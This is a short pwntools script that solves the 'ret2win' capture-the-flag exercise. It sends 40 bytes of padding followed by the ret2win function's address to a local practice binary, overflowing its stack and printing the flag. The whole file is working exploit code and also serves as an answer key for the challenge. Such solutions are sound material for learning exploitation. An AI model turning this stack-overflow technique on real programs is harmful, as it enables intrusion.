from pwn import *

X64_PADDING = 40

elf = context.binary = ELF("ret2win")

ret2win_func = p64(elf.symbols.ret2win)

payload = b"\x90" * X64_PADDING + ret2win_func
info(f"payload: {payload}")

io = process(elf.path)
io.recvuntil(">")
io.sendline(payload)
# Get our flag!
flag = io.recvall()
success(flag)

